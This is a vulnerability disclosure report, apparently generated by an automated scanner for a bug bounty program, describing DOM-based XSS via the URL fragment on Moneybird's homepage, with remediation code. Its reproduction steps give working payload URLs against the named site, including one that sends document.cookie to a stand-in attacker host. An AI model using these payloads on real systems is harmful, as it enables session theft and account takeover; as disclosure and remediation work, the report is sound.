# DOM-Based Cross-Site Scripting (XSS) via URL Fragment

**Severity:** high | **CVSS:** 7.4 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**Platform:** HackerOne | **Program:** Moneybird
**Confidence:** high (Playwright-verified: alert marker fired)
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**OWASP:** A03:2021 – Injection

> ⚠️ **Requires manual browser verification before submission.** Fragment-based XSS cannot be confirmed with curl (fragments are never sent to the server). Open the PoC URL in a browser with DevTools open to confirm the alert fires.

## Description

The marketing homepage (`www.moneybird.com`) reads the URL fragment (`window.location.hash`) and writes it to the DOM via `innerHTML` without sanitization. Automated Playwright testing confirmed JavaScript execution: an `alert("secbot-xss-37")` payload in the fragment fired during the scan, and the payload reached at least two separate `innerHTML` sinks on the page.

An attacker can craft a malicious link and trick a Moneybird user into clicking it, executing arbitrary JavaScript in their browser session.

## Steps to Reproduce

**Manual verification (browser required):**
1. Open a fresh browser tab (Chrome, Firefox, or Safari)
2. Navigate to the following URL:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
3. Expected result: an alert box appears showing `moneybird.com`, confirming JavaScript execution
4. (Optional) A more impactful PoC that exfiltrates cookies:
   ```
   https://www.moneybird.com/#<img src=x onerror=fetch('https://attacker.example.com/?c='+document.cookie)>
   ```

**What SecBot detected (2026-03-22 scan):**
- Playwright loaded the page with `#<img src=x onerror=alert("secbot-xss-37")>` in the fragment
- The alert dialog fired, returning the marker `secbot-xss-37`
- Two distinct innerHTML sinks processed the unencoded fragment value

## Impact

An attacker sends a crafted link (e.g., in a phishing email targeting Moneybird customers) that:
- Steals session cookies and hijacks the authenticated Moneybird session
- Performs actions on behalf of the victim (create invoices, access financial data, exfiltrate client records)
- Redirects to a credential-phishing page mimicking the Moneybird login

The affected URL is the public marketing homepage — any visitor, authenticated or not, is vulnerable. For authenticated users the impact escalates to full account takeover.

## Suggested Fix

Never assign unsanitized fragment data to `innerHTML`:

```javascript
// VULNERABLE
document.getElementById('target').innerHTML = window.location.hash.slice(1);

// SAFE — plain text
document.getElementById('target').textContent = window.location.hash.slice(1);

// SAFE — if HTML rendering is required, sanitize first
import DOMPurify from 'dompurify';
document.getElementById('target').innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

Audit all code paths that read from `window.location.hash` and ensure none pipe the value into `innerHTML`, `outerHTML`, `document.write`, or `eval`.

## Affected URLs
- https://www.moneybird.com/

## References
- [OWASP: DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
